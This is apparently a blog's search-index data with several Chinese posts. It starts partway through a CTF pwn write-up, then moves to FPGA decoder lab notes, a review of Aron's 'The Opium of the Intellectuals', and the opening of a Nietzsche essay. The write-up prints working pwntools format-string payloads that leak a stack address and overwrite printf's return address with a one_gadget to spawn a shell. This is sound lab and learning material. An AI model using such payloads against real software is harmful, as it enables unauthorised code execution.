0x7fffffffdc18:\t0x8843981ffe157fda\t0x00007fffffffdcf8 \u003c skipped \u003e 0x7fffffffdce8:\t0x000000000000001c\t0x0000000000000001 0x7fffffffdcf8:\t0x00007fffffffe083\t0x0000000000000000 0x7fffffffdd08:\t0x00007fffffffe0a8\t0x00007fffffffe0be 0x7fffffffdd18:\t0x00007fffffffe0e7\t0x00007fffffffe15b 0x7fffffffdd28:\t0x00007fffffffe1b1\t0x00007fffffffe1c2 pwndbg\u0026gt; 0x7fffffffdc08 处的内存指向栈的另一处内存 0x00007fffffffdcf8 ，而 rsp 指向 0x7fffffffd9c8 ，所以 A 在栈中第 73 个位置，是相对格式字符串第 77 个参数，而 B 在栈中第 103 个位置， 相对 rsp 偏移值为 (103 - 1) * 8 = 0x330 。\n编写如下 payload 获取 printf() 的返回地址：\n1 2 3 4 5 6 7 8 9 10 # Second payload : leaking stack address payload2 = b\u0026#39;%77$016l\u0026#39; + b\u0026#39;lxKKKKKK\u0026#39; conn.sendline(payload2) recv2 = conn.recvuntil(b\u0026#39;KKKKKK\u0026#39;) recv2 = recv2.strip(b\u0026#39;KKKKKK\u0026#39;) arg_103_addr = int(recv2, 16) printf_ret_addr = arg_103_addr - 0x330 log.success(\u0026#34;arg_103_addr =\u0026gt; 0x{:016X}\u0026#34;.format(arg_103_addr)) log.success(\u0026#34;printf_ret_addr =\u0026gt; 0x{:016X}\u0026#34;.format(printf_ret_addr)) conn.interactive() 运行效果如下：\n获得 printf() 栈基址为 0x00007FFF27F65378\nHijacking printf() return addr \u0026amp; getting system shell 编写如下 payload 以执行 system call shell 并获取flag:\n1 2 3 4 5 6 # Third payload: getting system shell one_gadget = 0xebc85 + libc_addr payload3 = fmtstr_payload(6,{printf_ret_addr:one_gadget}) conn.sendline(payload3) conn.interactive() 最终运行结果如下：\n获得 flag 为 AAA{3sc@pe_f3Om_wh1l3_1_i5_E4sy}\n","date":"2024-07-21T01:09:28+08:00","permalink":"https://nepl1t.github.io/p/pwn01-rop-and-fsb/","title":"Pwn01 ROP and FSB"},{"content":"背景 七段数码管是由 7+1 个 LED 构成的数字显示器件，其中前面七个 LED 各自显示数字的一段，最后的一个LED显示小数点。它有十二个引脚，其中八个引脚用于控制七段数码管显示什么图案，四个引脚分别作为四位七段数码管的使能信号，即分别控制四位七段数码管是否显示该图案。\n笔者使用的 Arduino 板的 LED 是 共阳极的，因此低电平才能点亮，即当信号为 0 时亮起，为 1 时熄灭。为了节约管脚，它们都使用了同一组输入信号，因此同一时间四个七段数码管都会显示相同的内容。如下图：\n本次我们要使用七段数码管实现十六进制译码器 (Hex 7-Segment Decoder Display)，并且实现数码管显示功能。\n真值表与电路设计 七段数码管可以将十六进制数字以下图的形式显示：\n因此我们可以设计出如下的真值表：\n$X_b$ $X_h$ $a$ $b$ $c$ $d$ $e$ $f$ $g$ 0000 0 0 0 0 0 0 0 1 0001 1 1 0 0 1 1 1 1 0010 2 0 0 1 0 0 1 0 0011 3 0 0 0 0 1 1 0 0100 4 1 0 0 1 1 0 0 0101 5 0 1 0 0 1 0 0 0110 6 0 1 0 0 0 0 0 0111 7 0 0 0 1 1 1 1 1000 8 0 0 0 0 0 0 0 1001 9 0 0 0 0 1 0 0 1010 A 0 0 0 1 0 0 0 1011 B 1 1 0 0 0 0 0 1100 C 0 1 1 0 0 0 1 1101 D 1 0 0 0 0 1 0 1110 E 0 1 1 0 0 0 0 1111 F 0 1 1 1 0 0 0 如果我们设四位输入信号（16位译码器是 4-16 的） 为 $I_0,I_1,I_2,I_3$ ，那么输出到七个引脚 $a,b,c,d,e,f,g,h$ 的信号可看作是七个关于这四位输入信号的布尔函数。对每个布尔函数我们都可以画出相应的电路图，但是感觉有些复杂，为什么我们不能进行化简呢？正好输入信号就是四位，可以使用 K-map 优化，事情就这样成了，比如 $a,b,e$ 这三个引脚的优化：\n根据卡诺图我们可以得到:\na=I3‾⋅I2‾⋅I1‾⋅I0+I3‾⋅I2⋅I1‾⋅I0‾+I3⋅I2‾⋅I1⋅I0+I3⋅I2⋅I1‾⋅I0b=I3‾⋅I2⋅I1‾⋅I0+I2⋅I1⋅I0‾+I3⋅I1⋅I0+I3⋅I2⋅I0‾e=I3‾⋅I0+I3‾⋅I2⋅I1‾+I2‾⋅I1‾⋅I0\\begin{aligned} a \u0026amp;= \\overline{I_3} \\cdot \\overline{I_2} \\cdot \\overline{I_1} \\cdot I_0+ \\overline{I_3} \\cdot I_2 \\cdot \\overline{I_1} \\cdot \\overline{I_0} +I_3 \\cdot \\overline{I_2} \\cdot I_1 \\cdot I_0+I_3 \\cdot I_2 \\cdot \\overline{I_1} \\cdot I_0\\\\ b \u0026amp;= \\overline{I_3} \\cdot I_2 \\cdot \\overline{I_1} \\cdot I_0+I_2 \\cdot I_1 \\cdot \\overline{I_0} +I_3 \\cdot I_1 \\cdot I_0+I_3 \\cdot I_2 \\cdot \\overline{I_0} \\\\ e \u0026amp;= \\overline{I_3} \\cdot I_0+ \\overline{I_3} \\cdot I_2 \\cdot \\overline{I_1} + \\overline{I_2} \\cdot \\overline{I_1} \\cdot I_0\\\\ \\end{aligned} abe\u0026ZeroWidthSpace;=I3\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I2\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;+I3\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I2\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;+I3\u0026ZeroWidthSpace;⋅I2\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;+I3\u0026ZeroWidthSpace;⋅I2\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;=I3\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I2\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;+I2\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;+I3\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;+I3\u0026ZeroWidthSpace;⋅I2\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;=I3\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;+I3\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I2\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;+I2\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;⋅I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;\n同理其它引脚的表达式也如下：\n$$ \\begin{aligned} c \u0026amp;= \\overline{I_3} \\cdot \\overline{I_2} \\cdot I_1 \\cdot \\overline{I_0} +I_3 \\cdot I_2 \\cdot \\overline{I_0} +I_3 \\cdot I_2 \\cdot I_1\\\\ d \u0026amp;= \\overline{I_3} \\cdot \\overline{I_2} \\cdot \\overline{I_1} \\cdot I_0+ \\overline{I_3} \\cdot I_2 \\cdot \\overline{I_1} \\cdot \\overline{I_0} +I_2 \\cdot I_1 \\cdot I_0+I_3 \\cdot \\overline{I_2} \\cdot I_1 \\cdot \\overline{I_0} \\\\ f \u0026amp;= \\overline{I_3} \\cdot \\overline{I_2} \\cdot I_0+ \\overline{I_3} \\cdot \\overline{I_2} \\cdot I_1+ \\overline{I_3} \\cdot I_1 \\cdot I_0+I_3 \\cdot I_2 \\cdot \\overline{I_1} \\cdot I_0\\\\ g \u0026amp;= \\overline{I_3} \\cdot \\overline{I_2} \\cdot \\overline{I_1} + \\overline{I_3} \\cdot I_2 \\cdot I_1 \\cdot I_0+I_3 \\cdot I_2 \\cdot \\overline{I_1} \\cdot \\overline{I_0} \\\\ \\end{aligned} $$\n根据简化后的表达式，我们可以画出如下的电路图：\n在 Logisim 上模拟运行的结果如下\n仿真激励与上板验证 我们将画好图的模块导出为 verilog 文件 MyMC14495.v ，并且为其编写激励模块：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 module MyMC14495_tb(); reg EN; reg [3:0] I; wire p; wire a; wire b; wire c; wire d; wire e; wire f; wire g; MyMC14495 simu_MC14495(.EN(EN), .I0(I[0]), .I1(I[1]), .I2(I[2]), .I3(I[3]), .a(a), .b(b), .c(c), .d(d), .e(e), .f(f), .g(g)); integer i; initial begin I[3] = 0; I[2] = 0; I[1] = 0; I[0] = 0; EN = 0; for(i=0;i\u0026lt;=15;i=i+1)begin #50; {I[3],I[2],I[1],I[0]}=i; end #50; EN = 1; end endmodule 在 Vivado 上运行仿真激励得到如下结果：\n使用 Verilog 进行接线，编写引脚约束文件。上板验证，但是有盒我就不放图图了。\n使四个七段数码管同时显示四个数字？ 可以利用视觉残留效应：当物体在快速运动时, 人眼所看到的影像消失后，人眼仍能继续保留其影像 $\\frac{1}{24}$ 秒左右的图像，因此我们可以用时钟作为选择器，以一定的（足够高的）频率输出四位的信号控制四个数码管的使能端，使得每次只亮起一个数码管，这个数码管显示的是其对应的数字（类似于显示器的扫描线）。这样的话，在第二个数字亮起的同时，上一个数字的像还没有从人眼中消失，在视觉上便得到了同时显示四个数字的效果：\nTime $E_3E_2E_1E_0$ $O$ 0 1110 N_0 1 1101 N_1 2 1011 N_2 3 0111 N_3 4 1110 N_0 \u0026hellip; \u0026hellip; \u0026hellip; 因为是四个数码管，因此这四段数码管应该在 $\\frac{1}{24}$ 秒内完成一次扫描循环，单个数码管亮起熄灭的时间则是 $\\frac{1}{24}\\cdot\\frac{1}{4}=\\frac{1}{96}$ 秒。 这是我下周将要实现的内容。下播。\n","date":"2024-04-15T03:12:52+08:00","permalink":"https://nepl1t.github.io/p/fpga02_%E4%B8%83%E6%AE%B5%E6%95%B0%E7%A0%81%E7%AE%A1%E6%98%BE%E7%A4%BA%E8%AF%91%E7%A0%81%E5%99%A8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/","title":"FPGA02_七段数码管显示译码器设计与应用"},{"content":"3-8 译码器的设计 用三个 bit 的输入信号来得到八个 bit 的输出信号，一个十分自然的思路便是使用二进制编码：毕竟我们有 $2^3=8$ 。如果我们将作为输入信号的三个 bit 记作 $I_0, I_1, I_2$， 作为八个输出信号的 bit 记作 $O_0, O_1, \\dots, O_8$ ，那么我们可以作出如下的真值表：\nIndex $I_2$ $I_1$ $I_0$ $O_0$ $O_1$ $O_2$ $O_3$ $O_4$ $O_5$ $O_6$ $O_7$ 0 0 0 0 1 0 0 0 0 0 0 0 1 0 0 1 0 1 0 0 0 0 0 0 2 0 1 0 0 0 1 0 0 0 0 0 3 0 1 1 0 0 0 1 0 0 0 0 4 1 0 0 0 0 0 0 1 0 0 0 5 1 0 1 0 0 0 0 0 1 0 0 6 1 1 0 0 0 0 0 0 0 1 0 7 1 1 1 0 0 0 0 0 0 0 1 很显然，如果我们将 $O_0, \\dots, O_7$ 作为八个布尔函数来看的话，它们都只有唯一一个值为1的最小项，所以这个最小项便是它们的最简表达式。因此我们有\nO0=I2I1I0‾,O4=I2I1I0‾O1=I2I1‾I0,O5=I2I1‾I0O2=I2‾I1I0‾,O6=I2I1I0‾O3=I2‾I1I0,O7=I2I1I0\\begin{aligned} \u0026amp;O_0=\\overline{I_2I_1I_0},\\qquad O_4=I_2\\overline{I_1I_0}\\\\ \u0026amp;O_1=\\overline{I_2I_1}I_0,\\qquad O_5=I_2\\overline{I_1}I_0\\\\ \u0026amp;O_2=\\overline{I_2}I_1\\overline{I_0},\\qquad O_6=I_2I_1\\overline{I_0}\\\\ \u0026amp;O_3=\\overline{I_2}I_1I_0,\\qquad O_7=I_2I_1I_0\\\\ \\end{aligned} \u0026ZeroWidthSpace;O0\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;,O4\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;O1\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;,O5\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;O2\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;,O6\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;O3\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;,O7\u0026ZeroWidthSpace;=I2\u0026ZeroWidthSpace;I1\u0026ZeroWidthSpace;I0\u0026ZeroWidthSpace;\u0026ZeroWidthSpace;\n通过 Logisim-Evolution 与布尔函数画出电路图并模拟运行如下：\n由图可知，电路符合我们的要求。\n使用 2-4 译码器实现 3-8 译码器 这是一个 2-4 译码器的电路结构\n现在我们需要用两个 2-4 译码器来实现一个 3-8 译码器。既然作为输入信号的八个三位二次元组合 $000,001,\\dots,111$ 对应着八个仅一个对应的输出端为高电位的结果，我们可以将这八位输出端分割为高四位与低四位，分别由两个 2-4 译码器来控制。\n但是因为在我们这里，译码器的输出会且仅仅出现一个 $1$ ，而两个译码器的输出拼接会产生两个 $1$ 出来 (例如 $0010\\ 0100$)，这样的结果不符合我们对译码器输出的要求，因此我们需要给两个译码器分别安装一个使能端，在同一时间内，只能有一个使能端开启，即同一时间内只能有一个译码器为激活状态，而未激活的译码器结果应输出 $0000$.\n假设高四位译码器的使能端接收信号记作 $E_H$，输出的四位信号记作 $O_H$，输出结果对应的二位输入为 $I\u0026rsquo;_H$， 低四位的使能端记作 $E_L$，输出记作 $O_L$ ，输出结果对应的二位输入为 $I\u0026rsquo;_L$，三位输入记作 $I_0,I_1,I_2$，则相应的真值表如下：\nIndex $I_2$ $I_1$ $I_0$ $E_H$ $E_L$ $O_H$ $O_L$ $I\u0026rsquo;_H$ $I\u0026rsquo;_L$ 0 0 0 0 0 1 0000 0001 X 00 1 0 0 1 0 1 0000 0010 X 01 2 0 1 0 0 1 0000 0100 X 10 3 0 1 1 0 1 0000 1000 X 11 4 1 0 0 1 0 0001 0000 00 X 5 1 0 1 1 0 0010 0000 01 X 6 1 1 0 1 0 0100 0000 10 X 7 1 1 1 1 0 1000 0000 11 X 观察真值表，我们可以得到一些重要性质，这对我们设计电路有巨大作用：\n当 $I_2$ 为低电位， $E_H$ 关闭， $E_L$ 开启，当 $I_2$ 为高电位， $E_H$ 开启， $E_L$ 关闭 $I\u0026rsquo;_H$ 与 $I\u0026rsquo;_L$ （如果使能端未关闭） 的组合始终与 $I_1I_0$ 的组合相同 综上，我们可以直接将 $I_0$ 与 $I_1$ 都同时接入两个译码器，同时引入 $I_2$ 作为使能端，一个取反值接入低四位译码器，另一个取原值接入高四位译码器。电路图如下：\n首先是安装使能端的 2-4 译码器\n以及由其构造的 3-8 译码器\n借助 3-8 译码器进行楼道灯控制 楼道灯控制是指：在一个楼道中，有三个开关控制一盏灯是否亮，且改变其中任意一个开关的状态时，灯的状态都会随之改变。\n例如，若某一时刻时，三个开关的状态分别是闭合、断开、闭合，而此时灯灭，则此时，将任意一个闭合的开关断开，或者将任意一个断开的开关闭合，则灯亮（即三个开关均闭合，或三个开关的状态分别为闭合、断开、断开，或三个开关的状态分别为断开、断开、闭合时，灯均亮）\n听起来有点像异或：每当有一位输入的信号改变，最后输出的1位信号都要改变。但是我们这里需要使用 3-8 译码器，一个直观的思路就是通过译码器的 8 位输出来控制灯的开关。注意到改变其中任意一个开关的状态，相当于将输入的二次元组合转为另一个相邻的二次元组合，这让我们想到格雷码，进而发现，假如我们将灯的开关状态作为一个关于 $I_0,I_1,I_2$ 的布尔函数，可以做出一个卡诺图：\n$I_0$ / $I_1,I_2$ 00 01 11 10 0 $1_0$ $0_1$ $1_3$ $0_2$ 1 $0_4$ $1_5$ $0_7$ $1_6$ 因此，我们可以将 $O_0, O_3, O_5, O_6$ 接入一个或门，用于控制灯的开关，另外四个信号作为无用信号排除。\n得到的电路图如下：\n","date":"2024-03-27T03:12:52+08:00","permalink":"https://nepl1t.github.io/p/fpga01_3-8%E8%AF%91%E7%A0%81%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/","title":"FPGA01_3-8译码器的设计与应用"},{"content":"“‘左派’、‘革命’、‘无产阶级’，这些流行的概念乃是政治乐观主义的重要神话‘进步’、‘理性’、‘人民’的为时已晚的复制品”1，从雷蒙·阿隆在他的大作《知识分子的鸦片》中做出的这一论断里，我们可以发现他尝试将“解放话语”的马克思主义与源自启蒙运动时期的进步主义思想相联系。\n事实上，他确实是这样做的。《知识分子的鸦片》第一章“政治的神话”由三个部分构成：“左派的神话”、“革命的神话”与“无产阶级的神话”。而在“左派的神话”一节中，阿隆就已经从大革命时主张“法律面前人人平等”的左派，大革命后在共和国与君主制徘徊不决的左派，与后来反对资产阶级的左派的演变中总结出所谓“左派无限可分”的观点了。然而，这样的新旧左派的指导思想和追求目标终究是不同的。“在自命为左派的不同群体之间，从未有过深刻的统一性”，而左派们虽然“可能消灭一种与某种经济运行方式联系在一起的不平等，但他们又会自动地重建另一种不平等”。在“革命的神话”中，阿隆认为“所谓的无产阶级革命，如同过去所有革命一样，只是由一个精英集团通过暴力取代另一个精英集团。这样的革命并未呈现出任何非同寻常的特征，能使人借此欢呼‘史前史的结束’”，而法国人之所以热衷于革命，只是他们希望藉由革命“延长或再现往昔的荣耀”罢了。“革命的概念表达了一种怀旧情绪，只要社会不够完美，只要人们仍旧渴望改革，这种怀旧情绪就会长久不衰”2。\n而在“无产阶级的神话”一章中，他对传统马克思主义的解放理论和无产阶级在“资本主义末世论”中扮演的救世主之形象的批评也颇具创见。“为什么无产阶级必须是革命者呢？”3阿隆如此问道。尽管无产阶级毫无疑问是资本主义的产物，因为只有资本主义，直接造成了无产阶级作为直接生产者与生产资料所有权之间的分离4，然而这只能表明无产阶级在资本主义社会中是一个特殊的主体，并不代表无产阶级一定要以革命者的身份出现。在这里，雷蒙·阿隆举出了美国的无产阶级为例：“在那里，工人组织要求并获得了欧洲人认为是属于福利国家或社会主义的许多改革。群众的领导者们对现行制度给予他们的地位感到满意，而群众本身也不渴望另一个社会或是另一种价值观”5。因此，无产阶级不总是革命的。不是所有的无产阶级者都能感到自己是被剥削压迫的一方，而他们自然也不大懂得要起来反抗的道理。一方面，平凡的出生有很大可能将无产阶级推到日子人的一方，而生活水平的提高与工业生产逐渐“人道化”（相较以前而言）也会缓和无产阶级的反叛情绪。\n更何况，在阿隆看来，无产阶级的界定问题，也是一个充满争议的论题：一个雷诺汽车厂的机械师与流水线上的工人，虽然干的都是体力活，但是工资千差万别，那么他是所谓无产阶级吗？以至于自视为革命领导者的法国左派知识分子们不得不宣称，“无产阶级必须具有革命性，否则他就没有理由存在”。比如萨特就说“无产阶级的统一性，完全取决于它与社会上其他阶级的关系，简而言之，完全取决于他的斗争”6对他们来说，重要的不是无产阶级这一范畴能否代表绝大多数人（无产阶级自己），也并不是人数的多少，而是“具有战斗精神的少数人能够合法的代表整个无产阶级”；而他们之所以要起来斗争，并非是为了他们自己，而是为了所有的人。\n但是，阿隆自己在马克思主义的研究角度本身就带有较大的偏见和臆断，也许这看起来并不是他的本意，但是考虑到此书是作为一篇论战檄文而作，我完全可以怀疑阿隆故意将错就错，为了方便射击而自立靶子。阿隆所谓的“马克思主义”和“马克思主义的历史哲学”，实质上来说是苏联官方陷入形而上学陷阱下的教条主义，这种教条主义的思想体系将马克思主义简单化、庸俗化成了一种绝对的真理体系，并基于此构造出了所谓充斥着历史决定论的、“无产阶级的末世论角色”的神话叙事。而苏联的绝对真理体系也深刻影响了当时的法国知识分子，导致其思想上产生种种误区。而路易·阿尔都塞，典型的左翼法国知识分子，则对这种神话叙事果断地做出了批判：只有唯心主义者才会试图把自己的学说视为一种绝对的开始建构出来的绝对的真理体系，认为历史运动有着绝对的开始与结束，是“理性与解放”图式绘制出的基本矛盾但展开，而历史唯物主义仅仅认为历史有一种由结构的总体多元决定的趋势——其从未有这些绝对的起点与终点。7因此我们在此能够看出雷蒙·阿隆在这方面的自相矛盾：一方面，他指出左派知识分子之间的差异极大，而在另一方面，他在法国左翼知识分子的批评中，又一股脑地给他们全扣上了“亲苏派”的帽子，忽视了自己先前提到的知识分子的个体差异性。\n例如说，还是路易·阿尔都塞，被雷蒙·阿隆多次“点名批评”的他，就曾不止一次对阿隆笔下的“政治乐观主义”的绝对真理体系提出批评。雷蒙·阿隆写道，“左派的乐观主义是由这样一种强烈情感——即赞美理性的力量，确信科学之应用于工业将彻底改变集体秩序和个体处境——所产生与维系”。8而在阿尔都塞看来，这种乐观主义实质上是资产阶级的哲学，而在本质上是一种主体哲学，倡导的是一种理论的人道主义。9马克思早期也是深陷在这种理论的泥淖中, 以为理性加自由的模式能够解决现实的一切困难。在经历了一系列社会、政治的嬗变之后, 马克思彻底地看清了这种理论本身的神秘性, 即以一种抽象的、思辨的方式来塑造人, 从而在一种缺乏历史和现实内容的论述中虚假地倡导人的价值及其实现。10众所周知，马克思主义从来不是什么绝对的真理体系，而是一种发展的科学，其众多经典的结论，例如马克思关于经济基础和上层建筑的论断：“在不同的所有制形式上，在生存的社会条件上，耸立着由各种不同情感、幻想、思想方式和世界观构成的整个上层建筑。整个阶级在它的物质条件和相应的社会关系的基础上创造和构成这一切。”11，大多是由描述性的语言表述的，而苏联人却将这种本应作为理论起点的特定理论简单粗暴地视作放之四海皆准的真理。\n再者，尽管阿隆冷静地指出了当时的法国左翼知识分子对共产主义运动前景的过分乐观并予以正确的批评，但笔者还是不免感到，他对资本主义社会现实的认识似乎还是肤浅了点，换句话说，是反而对自由主义的发展前景过分乐观了。阿隆最终选择将未来交付于怀疑主义，这固然是平息意识形态狂热的一个途径，但在当下看来，普遍的怀疑和解构共产主义宏大叙事后的新自由主义带来的并不是有理智的信仰或者审慎的怀疑主义，而是更为严重的虚无主义与普遍性、系统性的信仰危机。而相对应的，以福山为代表的知识分子们又转而将自由主义给宏大叙事化了——“上帝之死在人的灵魂中留下了一片空白，但是内心需要依旧存在，需要一种新的基督教来满足它。只有知识分子能够发明甚至宣传一种为学者所接受的旧信条的替代物”12，阿隆在这里深刻地洞见了他的时代，但也以一种可能并不是他想要的方式预言了将来的反复。与其说是一个“冷静旁观的介入者”，雷蒙·阿隆更像是一位天气预报员，能够精准地预测天气改变，但对现状无计可施。\n尽管当时那个意识形态做疾风暴雨般斗争的时代看起来是结束了，而政治乐观主义的乌托邦也被扫进了垃圾堆，阿隆在书中语言的新的时代，那个将政治当作致力于社会发展的努力和控制生活的艺术的，现实主义政治的时代看似到来了。但是，当我们请走了政治乐观主义的乌托邦后，引进家门似乎是全新的、现实主义的、娱乐至死的乌托邦。而人们的狂热，也早已从意识形态上转到消费、娱乐等其他的事物上去了。尽管现在的左翼有着鲍德里亚、朗西埃、齐泽克、阿甘本和巴迪欧等新一代的激进理论家，而他们“似乎已经建构了一种后马克思思潮的全新的资本主义批判尺度和另类先锋话语。”13，但无论是左派的他们还是右派的其他知识分子，其影响力和话语权都早已大不如前。我很好奇像雷蒙·阿隆这样，自我标榜着审慎理性、循序渐进的意识形态家要是来到现在的这个世界会作何反应，这样我们就能看出他所反对的到底是共产主义还是早已泛化的“狂热”本身了。\n雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第88页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，，第4页，第20页，第38页，第60页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第66页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n见《资本论》第一卷第二十四章：“资本关系以劳动者和劳动实现条件的所有权之间的分离为前提。资本主义生产一旦站稳脚跟，它就不仅保持这种分离，而且以不断扩大的规模再生产这种分离。因此，创造资本关系的过程，只能是劳动者和他的劳动条件的所有权分离的过程，这个过程一方面使社会的生活资料和生产资料转化为资本，另一方面使直接生产者转化为雇佣工人。”。《马克思恩格斯全集》第四十四卷，北京：人民出版社，2001年，第821页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第290页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n让-保罗·萨特：《共产主义者与和平》，载于《现代》1952年10-11月号\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nF-Hreinskilin：如何评价雷蒙.阿隆的作品《知识分子的鸦片》？2023年9月23日，https://www.zhihu.com/question/35762706/answer/3223395957 ，2023年12月22日\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第284页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n林青：《晚期阿尔都塞对“认识论断裂”的自我突破》，《哲学研究》2011年第4期\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n路易·阿尔都塞：《自我批评论文集》，杜章智、沈起予译，台湾：远流出版事业股份有限公司，1990年，第81页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n马克思：《路易·波拿巴的雾月十八日》，《马克思恩格斯全集》第八卷，北京：人民出版社，2009年，第149页。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第261页\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n张一兵：《无分之分：治安构序逻辑断裂中生成的失序政治——朗西埃后马克思生命政治哲学的异质走向》，《社会科学研究》2013年第1期\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2024-01-17T11:14:25+08:00","image":"https://tse1-mm.cn.bing.net/th/id/OIP-C.txr2PFDLpE7uIBsfYge5kQHaEz?rs=1\u0026pid=ImgDetMain","permalink":"https://nepl1t.github.io/p/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E5%91%98%E4%B8%8D%E8%83%BD%E6%94%B9%E5%8F%98%E5%A4%A9%E6%B0%94-%E8%AF%BB%E7%9F%A5%E8%AF%86%E5%88%86%E5%AD%90%E7%9A%84%E9%B8%A6%E7%89%87/","title":"天气预报员不能改变天气 ————读《知识分子的鸦片》"},{"content":" 1 本文基于《论道德的谱系》商务印书馆 2018年版，赵千帆译本。 1 尼采在本书中的道德批评在其序言对人类有限性的论述中就可以窥知一二了。第一，他指出现代人早已失去了自我反思的动力，如《新约·马太全书》所写 “你的财宝在哪里，你的心也在哪里” ，人一心所想的即为 “把什么东西 ‘带回家去’ ” ，而人的生命就其本身而言，并非其所在意的地方。第二，他认为现代人即使拥有自我认识的意愿，也徒有是心而余力不足矣。他认为 “道德意涵在现代社会中的扭曲” 阻止了人这个类型达到它 “本身原来可能达到的某种最高级的强大与壮丽” ，不能做出正确的道德判断阻止了人进一步获得认识自己的能力。综上，尼采写道：“我们就是必然会对自己保持陌生，我们不理解我们自己，我们必须混淆自己”。\n尼采的道德谱系学是以一个很 “尼采式” 的问题展开的，即 “我们的善和恶到底来自何种起源？”，进一步准确论述，也就是 “人类是在何种方式下为自己发明的那些善恶价值判断的？” ；而在人的善恶价值判断起源问题之外，另外一个问题也显得同等重要：人的善恶价值是否有价值？\n很显然，我们都知道，尼采对后一个问题持强烈的否定态度。在序言里，他尤其是针对所谓 “非利己者” 的善，即：同情之本能、自我否定之本能、自我牺牲之本能，做出了激烈的批评：他认为这是 “意志转而反对生命” 的例子。在他看来，同情泛滥使得人放弃从自身寻找高贵和伟大的努力，转而用廉价的共感来帮助弱者，使得社会的道德风气变得靡乱不堪、软弱至极。而对同情的推崇像是一种瘟疫，侵袭了许多欧洲的哲学家，甚至大有要将欧洲文化转化为一种 “全新的佛教” ，径直通向虚无主义之势。同时期的哲学家们都十分重视同情或怜悯，而这反而是自古以来的哲学家们（尼采在这里取了柏拉图、斯宾诺莎、拉罗什福克、康德四个例子）所贬斥的。\n柏拉图 “对同情的驳斥” 柏拉图认为，人性中最美好的部分是由理性掌控的。而能熟练运用理性的人，便是所谓 “优秀的人” ，而面对不幸时，一个优秀的人，一个男子汉，以能听从理性的指导，以能压抑住本性中渴望痛哭流涕以求发泄的部分，“以能忍耐能保持平静而自豪” 。\n而剧场与诗歌 “在看别人的苦难，赞美而怜悯别人，宣扬自己的美德而又表演出极端苦痛” 。这种 “同情与怜悯” 情感的快感被释放之后，往往会被人不加反思地加以吸收（因为戏剧不是自己的苦难，而吸收这种情感会让自己感到快乐）。这样的吸收会潜移默化地 